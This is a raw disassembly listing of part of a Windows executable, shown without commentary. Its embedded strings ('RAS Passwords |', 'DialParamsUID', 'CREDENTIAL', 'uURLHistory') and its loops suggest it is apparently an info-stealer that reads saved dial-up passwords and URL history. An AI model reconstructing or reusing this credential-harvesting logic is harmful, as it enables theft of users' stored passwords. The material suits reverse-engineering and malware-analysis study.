  40826d:	89 55 d4             	mov    %edx,-0x2c(%ebp)
  408270:	89 45 fc             	mov    %eax,-0x4(%ebp)
  408273:	33 c0                	xor    %eax,%eax
  408275:	55                   	push   %ebp
  408276:	68 1b 86 40 00       	push   $0x40861b
  40827b:	64 ff 30             	push   %fs:(%eax)
  40827e:	64 89 20             	mov    %esp,%fs:(%eax)
  408281:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408284:	e8 37 98 ff ff       	call   0x401ac0
  408289:	e8 62 fd ff ff       	call   0x407ff0
  40828e:	89 45 f0             	mov    %eax,-0x10(%ebp)
  408291:	83 7d f0 00          	cmpl   $0x0,-0x10(%ebp)
  408295:	0f 84 2a 03 00 00    	je     0x4085c5
  40829b:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40829e:	50                   	push   %eax
  40829f:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4082a2:	b9 01 00 00 00       	mov    $0x1,%ecx
  4082a7:	8b 15 14 82 40 00    	mov    0x408214,%edx
  4082ad:	e8 0a ad ff ff       	call   0x402fbc
  4082b2:	83 c4 04             	add    $0x4,%esp
  4082b5:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4082b8:	b8 08 01 00 00       	mov    $0x108,%eax
  4082bd:	89 02                	mov    %eax,(%edx)
  4082bf:	f7 6d f0             	imull  -0x10(%ebp)
  4082c2:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4082c5:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4082c8:	50                   	push   %eax
  4082c9:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4082cc:	50                   	push   %eax
  4082cd:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4082d0:	50                   	push   %eax
  4082d1:	6a 00                	push   $0x0
  4082d3:	6a 00                	push   $0x0
  4082d5:	e8 aa f8 ff ff       	call   0x407b84
  4082da:	85 c0                	test   %eax,%eax
  4082dc:	0f 85 e3 02 00 00    	jne    0x4085c5
  4082e2:	c7 85 3c ff ff ff 94 	movl   $0x94,-0xc4(%ebp)
  4082e9:	00 00 00 
  4082ec:	8d 85 3c ff ff ff    	lea    -0xc4(%ebp),%eax
  4082f2:	50                   	push   %eax
  4082f3:	e8 28 b3 ff ff       	call   0x403620
  4082f8:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4082fb:	ba 05 01 00 00       	mov    $0x105,%edx
  408300:	e8 6f 9d ff ff       	call   0x402074
  408305:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  408308:	ba 05 01 00 00       	mov    $0x105,%edx
  40830d:	e8 62 9d ff ff       	call   0x402074
  408312:	83 bd 4c ff ff ff 02 	cmpl   $0x2,-0xb4(%ebp)
  408319:	75 76                	jne    0x408391
  40831b:	83 bd 40 ff ff ff 05 	cmpl   $0x5,-0xc0(%ebp)
  408322:	72 6d                	jb     0x408391
  408324:	6a 00                	push   $0x0
  408326:	6a 1a                	push   $0x1a
  408328:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40832b:	e8 6c 9c ff ff       	call   0x401f9c
  408330:	50                   	push   %eax
  408331:	6a 00                	push   $0x0
  408333:	e8 44 f8 ff ff       	call   0x407b7c
  408338:	85 c0                	test   %eax,%eax
  40833a:	74 1c                	je     0x408358
  40833c:	8d 95 34 f4 ff ff    	lea    -0xbcc(%ebp),%edx
  408342:	8b 45 e8             	mov    -0x18(%ebp),%eax
  408345:	e8 02 fc ff ff       	call   0x407f4c
  40834a:	8b 95 34 f4 ff ff    	mov    -0xbcc(%ebp),%edx
  408350:	8d 45 e8             	lea    -0x18(%ebp),%eax
  408353:	e8 00 98 ff ff       	call   0x401b58
  408358:	6a 00                	push   $0x0
  40835a:	6a 23                	push   $0x23
  40835c:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40835f:	e8 38 9c ff ff       	call   0x401f9c
  408364:	50                   	push   %eax
  408365:	6a 00                	push   $0x0
  408367:	e8 10 f8 ff ff       	call   0x407b7c
  40836c:	85 c0                	test   %eax,%eax
  40836e:	74 1c                	je     0x40838c
  408370:	8d 95 30 f4 ff ff    	lea    -0xbd0(%ebp),%edx
  408376:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  408379:	e8 ce fb ff ff       	call   0x407f4c
  40837e:	8b 95 30 f4 ff ff    	mov    -0xbd0(%ebp),%edx
  408384:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  408387:	e8 cc 97 ff ff       	call   0x401b58
  40838c:	e8 af fa ff ff       	call   0x407e40
  408391:	c7 45 e0 ff ff ff ff 	movl   $0xffffffff,-0x20(%ebp)
  408398:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40839b:	48                   	dec    %eax
  40839c:	85 c0                	test   %eax,%eax
  40839e:	0f 8c 21 02 00 00    	jl     0x4085c5
  4083a4:	40                   	inc    %eax
  4083a5:	89 45 d0             	mov    %eax,-0x30(%ebp)
  4083a8:	33 f6                	xor    %esi,%esi
  4083aa:	c7 85 20 fb ff ff 1c 	movl   $0x41c,-0x4e0(%ebp)
  4083b1:	04 00 00 
  4083b4:	8b de                	mov    %esi,%ebx
  4083b6:	c1 e3 05             	shl    $0x5,%ebx
  4083b9:	03 de                	add    %esi,%ebx
  4083bb:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4083be:	8d 44 d8 04          	lea    0x4(%eax,%ebx,8),%eax
  4083c2:	8d 95 24 fb ff ff    	lea    -0x4dc(%ebp),%edx
  4083c8:	b9 00 01 00 00       	mov    $0x100,%ecx
  4083cd:	e8 86 8e ff ff       	call   0x401258
  4083d2:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4083d5:	50                   	push   %eax
  4083d6:	8d 85 20 fb ff ff    	lea    -0x4e0(%ebp),%eax
  4083dc:	50                   	push   %eax
  4083dd:	6a 00                	push   $0x0
  4083df:	e8 a8 f7 ff ff       	call   0x407b8c
  4083e4:	c7 45 f8 e8 06 00 00 	movl   $0x6e8,-0x8(%ebp)
  4083eb:	8d 85 38 f4 ff ff    	lea    -0xbc8(%ebp),%eax
  4083f1:	33 c9                	xor    %ecx,%ecx
  4083f3:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4083f6:	e8 19 90 ff ff       	call   0x401414
  4083fb:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4083fe:	89 85 38 f4 ff ff    	mov    %eax,-0xbc8(%ebp)
  408404:	8d 45 f8             	lea    -0x8(%ebp),%eax
  408407:	50                   	push   %eax
  408408:	6a 00                	push   $0x0
  40840a:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40840d:	50                   	push   %eax
  40840e:	8b 45 ec             	mov    -0x14(%ebp),%eax
  408411:	8d 54 d8 04          	lea    0x4(%eax,%ebx,8),%edx
  408415:	8d 8d 38 f4 ff ff    	lea    -0xbc8(%ebp),%ecx
  40841b:	33 c0                	xor    %eax,%eax
  40841d:	e8 9a fd ff ff       	call   0x4081bc
  408422:	83 bd 4c ff ff ff 02 	cmpl   $0x2,-0xb4(%ebp)
  408429:	0f 85 24 01 00 00    	jne    0x408553
  40842f:	83 bd 40 ff ff ff 05 	cmpl   $0x5,-0xc0(%ebp)
  408436:	0f 82 17 01 00 00    	jb     0x408553
  40843c:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40843f:	80 38 00             	cmpb   $0x0,(%eax)
  408442:	75 0c                	jne    0x408450
  408444:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  408447:	80 38 00             	cmpb   $0x0,(%eax)
  40844a:	0f 84 03 01 00 00    	je     0x408553
  408450:	8d 45 dc             	lea    -0x24(%ebp),%eax
  408453:	8d 95 24 fb ff ff    	lea    -0x4dc(%ebp),%edx
  408459:	e8 4e 98 ff ff       	call   0x401cac
  40845e:	8d 55 d8             	lea    -0x28(%ebp),%edx
  408461:	8b 45 dc             	mov    -0x24(%ebp),%eax
  408464:	e8 ff ad ff ff       	call   0x403268
  408469:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40846c:	e8 2b 9b ff ff       	call   0x401f9c
  408471:	50                   	push   %eax
  408472:	6a 00                	push   $0x0
  408474:	68 2c 86 40 00       	push   $0x40862c
  408479:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40847c:	e8 c7 9a ff ff       	call   0x401f48
  408481:	8b f8                	mov    %eax,%edi
  408483:	57                   	push   %edi
  408484:	e8 77 b1 ff ff       	call   0x403600
  408489:	8b d8                	mov    %eax,%ebx
  40848b:	85 db                	test   %ebx,%ebx
  40848d:	75 18                	jne    0x4084a7
  40848f:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  408492:	e8 05 9b ff ff       	call   0x401f9c
  408497:	50                   	push   %eax
  408498:	6a 00                	push   $0x0
  40849a:	68 2c 86 40 00       	push   $0x40862c
  40849f:	57                   	push   %edi
  4084a0:	e8 5b b1 ff ff       	call   0x403600
  4084a5:	8b d8                	mov    %eax,%ebx
  4084a7:	85 db                	test   %ebx,%ebx
  4084a9:	75 20                	jne    0x4084cb
  4084ab:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4084ae:	e8 e9 9a ff ff       	call   0x401f9c
  4084b3:	50                   	push   %eax
  4084b4:	6a 00                	push   $0x0
  4084b6:	68 2c 86 40 00       	push   $0x40862c
  4084bb:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4084be:	e8 85 9a ff ff       	call   0x401f48
  4084c3:	50                   	push   %eax
  4084c4:	e8 37 b1 ff ff       	call   0x403600
  4084c9:	8b d8                	mov    %eax,%ebx
  4084cb:	85 db                	test   %ebx,%ebx
  4084cd:	75 20                	jne    0x4084ef
  4084cf:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4084d2:	e8 c5 9a ff ff       	call   0x401f9c
  4084d7:	50                   	push   %eax
  4084d8:	6a 00                	push   $0x0
  4084da:	68 2c 86 40 00       	push   $0x40862c
  4084df:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4084e2:	e8 61 9a ff ff       	call   0x401f48
  4084e7:	50                   	push   %eax
  4084e8:	e8 13 b1 ff ff       	call   0x403600
  4084ed:	8b d8                	mov    %eax,%ebx
  4084ef:	85 db                	test   %ebx,%ebx
  4084f1:	76 60                	jbe    0x408553
  4084f3:	8b c3                	mov    %ebx,%eax
  4084f5:	33 d2                	xor    %edx,%edx
  4084f7:	52                   	push   %edx
  4084f8:	50                   	push   %eax
  4084f9:	8d 85 30 f3 ff ff    	lea    -0xcd0(%ebp),%eax
  4084ff:	e8 bc a6 ff ff       	call   0x402bc0
  408504:	8d 95 30 f3 ff ff    	lea    -0xcd0(%ebp),%edx
  40850a:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  40850d:	e8 06 98 ff ff       	call   0x401d18
  408512:	bf 00 01 00 00       	mov    $0x100,%edi
  408517:	bb bc e9 40 00       	mov    $0x40e9bc,%ebx
  40851c:	8b 03                	mov    (%ebx),%eax
  40851e:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  408521:	e8 6e 99 ff ff       	call   0x401e94
  408526:	75 25                	jne    0x40854d
  408528:	83 7b 04 00          	cmpl   $0x0,0x4(%ebx)
  40852c:	74 1f                	je     0x40854d
  40852e:	8b 43 04             	mov    0x4(%ebx),%eax
  408531:	e8 1a 98 ff ff       	call   0x401d50
  408536:	50                   	push   %eax
  408537:	8b 43 04             	mov    0x4(%ebx),%eax
  40853a:	e8 09 9a ff ff       	call   0x401f48
  40853f:	8b d0                	mov    %eax,%edx
  408541:	8d 85 28 fe ff ff    	lea    -0x1d8(%ebp),%eax
  408547:	59                   	pop    %ecx
  408548:	e8 eb fa ff ff       	call   0x408038
  40854d:	83 c3 08             	add    $0x8,%ebx
  408550:	4f                   	dec    %edi
  408551:	75 c9                	jne    0x40851c
  408553:	8d 85 27 fd ff ff    	lea    -0x2d9(%ebp),%eax
  408559:	85 c0                	test   %eax,%eax
  40855b:	74 5e                	je     0x4085bb
  40855d:	8d 85 28 fe ff ff    	lea    -0x1d8(%ebp),%eax
  408563:	85 c0                	test   %eax,%eax
  408565:	74 54                	je     0x4085bb
  408567:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40856a:	ff 30                	push   (%eax)
  40856c:	68 44 86 40 00       	push   $0x408644
  408571:	8d 85 2c f3 ff ff    	lea    -0xcd4(%ebp),%eax
  408577:	8d 95 27 fd ff ff    	lea    -0x2d9(%ebp),%edx
  40857d:	e8 2a 97 ff ff       	call   0x401cac
  408582:	ff b5 2c f3 ff ff    	push   -0xcd4(%ebp)
  408588:	68 5c 86 40 00       	push   $0x40865c
  40858d:	8d 85 28 f3 ff ff    	lea    -0xcd8(%ebp),%eax
  408593:	8d 95 28 fe ff ff    	lea    -0x1d8(%ebp),%edx
  408599:	e8 0e 97 ff ff       	call   0x401cac
  40859e:	ff b5 28 f3 ff ff    	push   -0xcd8(%ebp)
  4085a4:	68 5c 86 40 00       	push   $0x40865c
  4085a9:	68 68 86 40 00       	push   $0x408668
  4085ae:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4085b1:	ba 07 00 00 00       	mov    $0x7,%edx
  4085b6:	e8 55 98 ff ff       	call   0x401e10
  4085bb:	46                   	inc    %esi
  4085bc:	ff 4d d0             	decl   -0x30(%ebp)
  4085bf:	0f 85 e5 fd ff ff    	jne    0x4083aa
  4085c5:	33 c0                	xor    %eax,%eax
  4085c7:	5a                   	pop    %edx
  4085c8:	59                   	pop    %ecx
  4085c9:	59                   	pop    %ecx
  4085ca:	64 89 10             	mov    %edx,%fs:(%eax)
  4085cd:	68 22 86 40 00       	push   $0x408622
  4085d2:	8d 85 28 f3 ff ff    	lea    -0xcd8(%ebp),%eax
  4085d8:	ba 02 00 00 00       	mov    $0x2,%edx
  4085dd:	e8 02 95 ff ff       	call   0x401ae4
  4085e2:	8d 85 30 f4 ff ff    	lea    -0xbd0(%ebp),%eax
  4085e8:	ba 02 00 00 00       	mov    $0x2,%edx
  4085ed:	e8 f2 94 ff ff       	call   0x401ae4
  4085f2:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  4085f5:	ba 03 00 00 00       	mov    $0x3,%edx
  4085fa:	e8 e5 94 ff ff       	call   0x401ae4
  4085ff:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  408602:	ba 02 00 00 00       	mov    $0x2,%edx
  408607:	e8 d8 94 ff ff       	call   0x401ae4
  40860c:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40860f:	8b 15 14 82 40 00    	mov    0x408214,%edx
  408615:	e8 ae a9 ff ff       	call   0x402fc8
  40861a:	c3                   	ret
  40861b:	e9 ec 91 ff ff       	jmp    0x40180c
  408620:	eb b0                	jmp    0x4085d2
  408622:	5f                   	pop    %edi
  408623:	5e                   	pop    %esi
  408624:	5b                   	pop    %ebx
  408625:	8b e5                	mov    %ebp,%esp
  408627:	5d                   	pop    %ebp
  408628:	c3                   	ret
  408629:	00 00                	add    %al,(%eax)
  40862b:	00 44 69 61          	add    %al,0x61(%ecx,%ebp,2)
  40862f:	6c                   	insb   (%dx),%es:(%edi)
  408630:	50                   	push   %eax
  408631:	61                   	popa
  408632:	72 61                	jb     0x408695
  408634:	6d                   	insl   (%dx),%es:(%edi)
  408635:	73 55                	jae    0x40868c
  408637:	49                   	dec    %ecx
  408638:	44                   	inc    %esp
  408639:	00 00                	add    %al,(%eax)
  40863b:	00 ff                	add    %bh,%bh
  40863d:	ff                   	(bad)
  40863e:	ff                   	(bad)
  40863f:	ff 0f                	decl   (%edi)
  408641:	00 00                	add    %al,(%eax)
  408643:	00 52 41             	add    %dl,0x41(%edx)
  408646:	53                   	push   %ebx
  408647:	20 50 61             	and    %dl,0x61(%eax)
  40864a:	73 73                	jae    0x4086bf
  40864c:	77 6f                	ja     0x4086bd
  40864e:	72 64                	jb     0x4086b4
  408650:	73 20                	jae    0x408672
  408652:	7c 00                	jl     0x408654
  408654:	ff                   	(bad)
  408655:	ff                   	(bad)
  408656:	ff                   	(bad)
  408657:	ff 02                	incl   (%edx)
  408659:	00 00                	add    %al,(%eax)
  40865b:	00 20                	add    %ah,(%eax)
  40865d:	7c 00                	jl     0x40865f
  40865f:	00 ff                	add    %bh,%bh
  408661:	ff                   	(bad)
  408662:	ff                   	(bad)
  408663:	ff 02                	incl   (%edx)
  408665:	00 00                	add    %al,(%eax)
  408667:	00 0d 0a 00 00 55    	add    %cl,0x5500000a
  40866d:	8b ec                	mov    %esp,%ebp
  40866f:	33 c0                	xor    %eax,%eax
  408671:	55                   	push   %ebp
  408672:	68 a8 86 40 00       	push   $0x4086a8
  408677:	64 ff 30             	push   %fs:(%eax)
  40867a:	64 89 20             	mov    %esp,%fs:(%eax)
  40867d:	ff 05 b4 e9 40 00    	incl   0x40e9b4
  408683:	75 15                	jne    0x40869a
  408685:	b8 bc e9 40 00       	mov    $0x40e9bc,%eax
  40868a:	b9 00 01 00 00       	mov    $0x100,%ecx
  40868f:	8b 15 30 7b 40 00    	mov    0x407b30,%edx
  408695:	e8 8a 9e ff ff       	call   0x402524
  40869a:	33 c0                	xor    %eax,%eax
  40869c:	5a                   	pop    %edx
  40869d:	59                   	pop    %ecx
  40869e:	59                   	pop    %ecx
  40869f:	64 89 10             	mov    %edx,%fs:(%eax)
  4086a2:	68 af 86 40 00       	push   $0x4086af
  4086a7:	c3                   	ret
  4086a8:	e9 5f 91 ff ff       	jmp    0x40180c
  4086ad:	eb f8                	jmp    0x4086a7
  4086af:	5d                   	pop    %ebp
  4086b0:	c3                   	ret
  4086b1:	8d 40 00             	lea    0x0(%eax),%eax
  4086b4:	83 2d b4 e9 40 00 01 	subl   $0x1,0x40e9b4
  4086bb:	c3                   	ret
  4086bc:	c0 86 40 00 11 0b 50 	rolb   $0x50,0xb110040(%esi)
  4086c3:	43                   	inc    %ebx
  4086c4:	52                   	push   %edx
  4086c5:	45                   	inc    %ebp
  4086c6:	44                   	inc    %esp
  4086c7:	45                   	inc    %ebp
  4086c8:	4e                   	dec    %esi
  4086c9:	54                   	push   %esp
  4086ca:	49                   	dec    %ecx
  4086cb:	41                   	inc    %ecx
  4086cc:	4c                   	dec    %esp
  4086cd:	04 00                	add    $0x0,%al
  4086cf:	00 00                	add    %al,(%eax)
  4086d1:	00 00                	add    %al,(%eax)
  4086d3:	00 00                	add    %al,(%eax)
  4086d5:	ff                   	(bad)
  4086d6:	ff                   	(bad)
  4086d7:	ff                   	(bad)
  4086d8:	ff 00                	incl   (%eax)
  4086da:	00 00                	add    %al,(%eax)
  4086dc:	00 08                	add    %cl,(%eax)
  4086de:	43                   	inc    %ebx
  4086df:	72 79                	jb     0x40875a
  4086e1:	70 74                	jo     0x408757
  4086e3:	41                   	inc    %ecx
  4086e4:	70 69                	jo     0x40874f
  4086e6:	8b c0                	mov    %eax,%eax
  4086e8:	ff 25 34 03 41 00    	jmp    *0x410334
  4086ee:	8b c0                	mov    %eax,%eax
  4086f0:	ff 25 2c 03 41 00    	jmp    *0x41032c
  4086f6:	8b c0                	mov    %eax,%eax
  4086f8:	55                   	push   %ebp
  4086f9:	8b ec                	mov    %esp,%ebp
  4086fb:	33 c0                	xor    %eax,%eax
  4086fd:	55                   	push   %ebp
  4086fe:	68 1d 87 40 00       	push   $0x40871d
  408703:	64 ff 30             	push   %fs:(%eax)
  408706:	64 89 20             	mov    %esp,%fs:(%eax)
  408709:	ff 05 bc f1 40 00    	incl   0x40f1bc
  40870f:	33 c0                	xor    %eax,%eax
  408711:	5a                   	pop    %edx
  408712:	59                   	pop    %ecx
  408713:	59                   	pop    %ecx
  408714:	64 89 10             	mov    %edx,%fs:(%eax)
  408717:	68 24 87 40 00       	push   $0x408724
  40871c:	c3                   	ret
  40871d:	e9 ea 90 ff ff       	jmp    0x40180c
  408722:	eb f8                	jmp    0x40871c
  408724:	5d                   	pop    %ebp
  408725:	c3                   	ret
  408726:	8b c0                	mov    %eax,%eax
  408728:	83 2d bc f1 40 00 01 	subl   $0x1,0x40f1bc
  40872f:	c3                   	ret
  408730:	34 87                	xor    $0x87,%al
  408732:	40                   	inc    %eax
  408733:	00 11                	add    %dl,(%ecx)
  408735:	08 74 61 53          	or     %dh,0x53(%ecx,%eiz,2)
  408739:	74 72                	je     0x4087ad
  40873b:	69 6e 67 04 00 00 00 	imul   $0x4,0x67(%esi),%ebp
  408742:	00 00                	add    %al,(%eax)
  408744:	00 00                	add    %al,(%eax)
  408746:	ff                   	(bad)
  408747:	ff                   	(bad)
  408748:	ff                   	(bad)
  408749:	ff 00                	incl   (%eax)
  40874b:	00 00                	add    %al,(%eax)
  40874d:	00 0b                	add    %cl,(%ebx)
  40874f:	75 55                	jne    0x4087a6
  408751:	52                   	push   %edx
  408752:	4c                   	dec    %esp
  408753:	48                   	dec    %eax
  408754:	69 73 74 6f 72 79 8b 	imul   $0x8b79726f,0x74(%ebx),%esi
  40875b:	c0 e8 1f             	shr    $0x1f,%al
  40875e:	ea ff ff c3 8b c0 53 	ljmp   $0x53c0,$0x8bc3ffff
  408765:	56                   	push   %esi
  408766:	8b f2                	mov    %edx,%esi
  408768:	8b d8                	mov    %eax,%ebx
  40876a:	8b c6                	mov    %esi,%eax
  40876c:	e8 f3 a8 ff ff       	call   0x403064
  408771:	50                   	push   %eax
  408772:	68 8c 87 40 00       	push   $0x40878c
  408777:	6a 05                	push   $0x5
  408779:	6a 00                	push   $0x0
  40877b:	53                   	push   %ebx
  40877c:	e8 ef e9 ff ff       	call   0x407170
  408781:	e8 d6 ff ff ff       	call   0x40875c
  408786:	5e                   	pop    %esi
  408787:	5b                   	pop    %ebx
  408788:	c3                   	ret
	...
  408791:	00 00                	add    %al,(%eax)
  408793:	00 c0                	add    %al,%al
  408795:	00 00                	add    %al,(%eax)
  408797:	00 00                	add    %al,(%eax)
  408799:	00 00                	add    %al,(%eax)
  40879b:	46                   	inc    %esi
  40879c:	55                   	push   %ebp
  40879d:	8b ec                	mov    %esp,%ebp
  40879f:	83 c4 c8             	add    $0xffffffc8,%esp
  4087a2:	53                   	push   %ebx
  4087a3:	56                   	push   %esi
  4087a4:	57                   	push   %edi
  4087a5:	33 d2                	xor    %edx,%edx
  4087a7:	89 55 c8             	mov    %edx,-0x38(%ebp)
  4087aa:	89 55 fc             	mov    %edx,-0x4(%ebp)
  4087ad:	89 55 f4             	mov    %edx,-0xc(%ebp)
  4087b0:	8b f0                	mov    %eax,%esi
  4087b2:	33 c0                	xor    %eax,%eax
  4087b4:	55                   	push   %ebp
  4087b5:	68 e9 88 40 00       	push   $0x4088e9
  4087ba:	64 ff 30             	push   %fs:(%eax)
  4087bd:	64 89 20             	mov    %esp,%fs:(%eax)
  4087c0:	6a 00                	push   $0x0
  4087c2:	e8 b1 e9 ff ff       	call   0x407178
  4087c7:	33 db                	xor    %ebx,%ebx
  4087c9:	6a 01                	push   $0x1
  4087cb:	8b c6                	mov    %esi,%eax
  4087cd:	b9 01 00 00 00       	mov    $0x1,%ecx
  4087d2:	8b 15 30 87 40 00    	mov    0x408730,%edx
  4087d8:	e8 df a7 ff ff       	call   0x402fbc
  4087dd:	83 c4 04             	add    $0x4,%esp
  4087e0:	8d 55 c8             	lea    -0x38(%ebp),%edx
  4087e3:	b8 9c d0 40 00       	mov    $0x40d09c,%eax
  4087e8:	e8 77 ff ff ff       	call   0x408764
  4087ed:	8b 55 c8             	mov    -0x38(%ebp),%edx
  4087f0:	b8 c0 f1 40 00       	mov    $0x40f1c0,%eax
  4087f5:	b9 fc 88 40 00       	mov    $0x4088fc,%ecx
  4087fa:	e8 a9 a8 ff ff       	call   0x4030a8
  4087ff:	8d 45 fc             	lea    -0x4(%ebp),%eax
  408802:	e8 5d a8 ff ff       	call   0x403064
  408807:	50                   	push   %eax
  408808:	a1 c0 f1 40 00       	mov    0x40f1c0,%eax
  40880d:	50                   	push   %eax
  40880e:	8b 00                	mov    (%eax),%eax
  408810:	ff 50 1c             	call   *0x1c(%eax)
  408813:	6a 00                	push   $0x0
  408815:	68 0c 89 40 00       	push   $0x40890c
  40881a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40881d:	50                   	push   %eax
  40881e:	8b 00                	mov    (%eax),%eax
  408820:	ff 50 1c             	call   *0x1c(%eax)
  408823:	e9 80 00 00 00       	jmp    0x4088a8
  408828:	43                   	inc    %ebx
  408829:	53                   	push   %ebx
  40882a:	8b c6                	mov    %esi,%eax
  40882c:	b9 01 00 00 00       	mov    $0x1,%ecx
  408831:	8b 15 30 87 40 00    	mov    0x408730,%edx
  408837:	e8 80 a7 ff ff       	call   0x402fbc
  40883c:	83 c4 04             	add    $0x4,%esp
  40883f:	8d 45 f4             	lea    -0xc(%ebp),%eax
  408842:	8b 55 d0             	mov    -0x30(%ebp),%edx
  408845:	e8 92 94 ff ff       	call   0x401cdc
  40884a:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40884d:	b8 18 89 40 00       	mov    $0x408918,%eax
  408852:	e8 d5 97 ff ff       	call   0x40202c
  408857:	85 c0                	test   %eax,%eax
  408859:	74 1e                	je     0x408879
  40885b:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40885e:	50                   	push   %eax
  40885f:	8b 55 f4             	mov    -0xc(%ebp),%edx
  408862:	b8 18 89 40 00       	mov    $0x408918,%eax
  408867:	e8 c0 97 ff ff       	call   0x40202c
  40886c:	8b c8                	mov    %eax,%ecx
  40886e:	49                   	dec    %ecx
  40886f:	33 d2                	xor    %edx,%edx
  408871:	8b 45 f4             	mov    -0xc(%ebp),%eax
  408874:	e8 2b 97 ff ff       	call   0x401fa4
  408879:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40887c:	e8 cf 94 ff ff       	call   0x401d50
  408881:	40                   	inc    %eax
  408882:	03 c0                	add    %eax,%eax
  408884:	e8 eb 88 ff ff       	call   0x401174
  408889:	8b f8                	mov    %eax,%edi
  40888b:	8b 06                	mov    (%esi),%eax
  40888d:	89 7c 98 fc          	mov    %edi,-0x4(%eax,%ebx,4)
  408891:	8b 45 f4             	mov    -0xc(%ebp),%eax
  408894:	e8 b7 94 ff ff       	call   0x401d50
  408899:	40                   	inc    %eax
  40889a:	8b c8                	mov    %eax,%ecx
  40889c:	03 c9                	add    %ecx,%ecx
  40889e:	8b d7                	mov    %edi,%edx
  4088a0:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4088a3:	e8 80 a0 ff ff       	call   0x402928
  4088a8:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4088ab:	50                   	push   %eax
  4088ac:	8d 45 cc             	lea    -0x34(%ebp),%eax
  4088af:	50                   	push   %eax
  4088b0:	6a 01                	push   $0x1
  4088b2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4088b5:	50                   	push   %eax
  4088b6:	8b 00                	mov    (%eax),%eax
  4088b8:	ff 50 0c             	call   *0xc(%eax)
  4088bb:	85 c0                	test   %eax,%eax
  4088bd:	0f 84 65 ff ff ff    	je     0x408828
  4088c3:	33 c0                	xor    %eax,%eax
  4088c5:	5a                   	pop    %edx
  4088c6:	59                   	pop    %ecx
  4088c7:	59                   	pop    %ecx
  4088c8:	64 89 10             	mov    %edx,%fs:(%eax)
  4088cb:	68 f0 88 40 00       	push   $0x4088f0
  4088d0:	8d 45 c8             	lea    -0x38(%ebp),%eax
  4088d3:	e8 8c a7 ff ff       	call   0x403064
  4088d8:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4088db:	e8 e0 91 ff ff       	call   0x401ac0
  4088e0:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4088e3:	e8 7c a7 ff ff       	call   0x403064
  4088e8:	c3                   	ret
  4088e9:	e9 1e 8f ff ff       	jmp    0x40180c
  4088ee:	eb e0                	jmp    0x4088d0
  4088f0:	8b c3                	mov    %ebx,%eax
  4088f2:	5f                   	pop    %edi
  4088f3:	5e                   	pop    %esi
  4088f4:	5b                   	pop    %ebx
  4088f5:	8b e5                	mov    %ebp,%esp
  4088f7:	5d                   	pop    %ebp
  4088f8:	c3                   	ret
  4088f9:	00 00                	add    %al,(%eax)
  4088fb:	00 11                	add    %dl,(%ecx)
  4088fd:	dc a0 af 13 c3 d0    	fsubl  -0x2f3cec51(%eax)
  408903:	11 83 1a 00 c0 4f    	adc    %eax,0x4fc0001a(%ebx)
  408909:	d5 ae                	aad    $0xae
  40890b:	38 00                	cmp    %al,(%eax)
  40890d:	00 00                	add    %al,(%eax)
  40890f:	00 ff                	add    %bh,%bh
  408911:	ff                   	(bad)
  408912:	ff                   	(bad)
  408913:	ff 01                	incl   (%ecx)
  408915:	00 00                	add    %al,(%eax)
  408917:	00 3f                	add    %bh,(%edi)
  408919:	00 00                	add    %al,(%eax)
  40891b:	00 55 8b             	add    %dl,-0x75(%ebp)
  40891e:	ec                   	in     (%dx),%al
  40891f:	33 c0                	xor    %eax,%eax
  408921:	55                   	push   %ebp
  408922:	68 4d 89 40 00       	push   $0x40894d
  408927:	64 ff 30             	push   %fs:(%eax)
  40892a:	64 89 20             	mov    %esp,%fs:(%eax)
  40892d:	ff 05 c4 f1 40 00    	incl   0x40f1c4
  408933:	75 0a                	jne    0x40893f
  408935:	b8 c0 f1 40 00       	mov    $0x40f1c0,%eax
  40893a:	e8 25 a7 ff ff       	call   0x403064
  40893f:	33 c0                	xor    %eax,%eax
  408941:	5a                   	pop    %edx
  408942:	59                   	pop    %ecx
  408943:	59                   	pop    %ecx
  408944:	64 89 10             	mov    %edx,%fs:(%eax)
  408947:	68 54 89 40 00       	push   $0x408954
  40894c:	c3                   	ret
  40894d:	e9 ba 8e ff ff       	jmp    0x40180c
  408952:	eb f8                	jmp    0x40894c
  408954:	5d                   	pop    %ebp
  408955:	c3                   	ret
  408956:	8b c0                	mov    %eax,%eax
  408958:	83 2d c4 f1 40 00 01 	subl   $0x1,0x40f1c4
  40895f:	c3                   	ret
